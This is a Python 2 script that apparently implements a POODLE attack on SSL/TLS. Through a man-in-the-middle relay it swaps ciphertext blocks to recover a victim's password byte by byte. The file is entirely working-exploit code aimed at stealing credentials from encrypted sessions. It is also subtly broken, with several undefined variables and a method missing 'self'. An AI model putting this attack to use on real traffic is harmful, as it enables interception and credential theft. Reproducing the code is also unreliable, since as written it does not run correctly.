#!/usr/bin/env python

import socket
import sys

BLOCK_LENGTH = 16 # AES-256

MITM_SERVER_ADDRESS = ("127.0.0.1", 4747)
ORIGIN_CLIENT = "C"
ORIGIN_SEPARATOR = "-"
RESPONSE_SUCCESSFUL = "ok\n"

PADDING_LAMBDA = 6 # To make request end on block boundary

PADDING_CHAR = "a"
DECRYPT_BLOCK_FROM_LAST = 4 # Decrypt the 4th block counting from last


class PoodlePasswordDecrypter:
	def __init__(self):
		self.password = ""
		self.got_password = False
	
	def run(self):
		while not self.got_password:
			char = self.try_decipher_one_char(padding_chars)
			if char is not None:
				self.process_new_char(char)
				padding_chars += 1
	
	def try_decipher_one_char(self, padding_chars):
		mitm = MitmConnection()
		mitm.connect()
		mitm.send_initial_request(padding_chars)
		mitm.forward_loop()
		return mitm.decrypted_char
	
	def process_new_char(self, char):
		if self.is_end_of_password(char):
			self.got_password = True
		else:
			self.password += char
	
	def is_end_of_password(self, char):
		return char == "\r"


class MitmConnection:
	def __init__(self):
		self.block_exchanger = None
		self.decrypted_char = None
	
	def connect(self):
		self.socket = socket.create_connection(MITM_SERVER_ADDRESS)
		self.rfile = self.socket.makefile('rb', bufsize=-1)
		self.wfile = self.socket.makefile('wb', bufsize= 0)
	
	def send_initial_request(self, num_padding_chars):
		body_chars = PADDING_CHAR * num_padding_chars
		url_chars = PADDING_CHAR * self.__get_num_chars_to_make_request_fill_last_block(num_padding_chars)
		self.wfile.write('post("/%s", "%s");\n' % (url_chars, body_chars))
	
	def __get_num_chars_to_make_request_fill_last_block(self, num_padding_chars):
		return (BLOCK_LENGTH - ((num_padding_chars + PADDING_LAMBDA) % BLOCK_LENGTH))
	
	def forward_loop(self):
		packet = self.get_mitm_packet()
		while packet:
			send_packet = self.process_mitm_packet(packet)
			self.send_mitm_packet(send_packet)
			packet = self.get_mitm_packet()
	
	def get_mitm_packet(self):
		return self.rfile.readline()
	
	def process_mitm_packet(self, packet):
		if packet == RESPONSE_SUCCESSFUL:
			self.decrypted_char = self.block_exchanger.get_decrypted_char()
		else:
			mitm_packet = MitmPacket(packet)
			mitm_packet.process()
			if mitm_packet.block_exchanger:
				self.block_exchanger = mitm_packet.block_exchanger
			return mitm_packet.send_packet
	
	
	def send_mitm_packet(self, packet):
		if packet:
			self.wfile.write(packet)


class MitmPacket:
	def __init__(self, packet):
		self.packet = packet
		self.send_packet = packet
		self.block_exchanger = None
	
	def process(self):
		self.process_mitm_packet(packet)
	
	def process_mitm_packet(self, packet):
		origin = self.__get_origin(packet)
		if origin == ORIGIN_CLIENT:
			self.process_client_packet(packet)
	
	def process_client_packet(self, packet):
		data = self.__get_data(packet)
		tls_content_type = self.__get_tls_content_type(data)
		if tls_content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
			self.process_client_application_data(data)
	
	def process_client_application_data(data):
		self.block_exchanger = PoodleBlockExchanger(data)
		new_data = self.block_exchanger.exchange_blocks()
		self.send_packet = self.__reasemble_packet(ORIGIN_CLIENT, new_data)
	
	def __get_origin(self, packet):
		return packet[0]
	
	def __get_data(self, packet):
		return packet[2:].decode("base64")
	
	def __get_tls_content_type(self, data):
		return data[0]
	
	def __reasemble_packet(self, origin, data):
		return origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"


class PoodleBlockExchanger:
	def __init__(self, data):
		self.data = data
	
	def exchange_blocks(self):
		data_minus_last_block = self.data[:-BLOCK_LENGTH]
		block_to_inject = self.data[-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST):-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST-1)]
		self.previous_block = self.data[-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST+1):-BLOCK_LENGTH*(DECRYPT_BLOCK_FROM_LAST)]
		self.second_to_last_block = data_minus_last_block[-BLOCK_LENGTH:]
		return data_minus_last_block + block_to_inject
	
	def get_decrypted_char(self):
		last_block_last_byte_plaintext = (BLOCK_LENGTH - 1)
		second_to_last_block_last_byte_ciphertext = ord(self.second_to_last_block[-1])
		previous_block_last_byte_ciphertext = ord(self.previous_block[-1])
		return chr(last_byte_plaintext ^ second_to_last_block_last_byte_ciphertext ^ previous_block_last_byte_ciphertext)


if __name__ == "__main__":
	PoodlePasswordDecrypter().run()
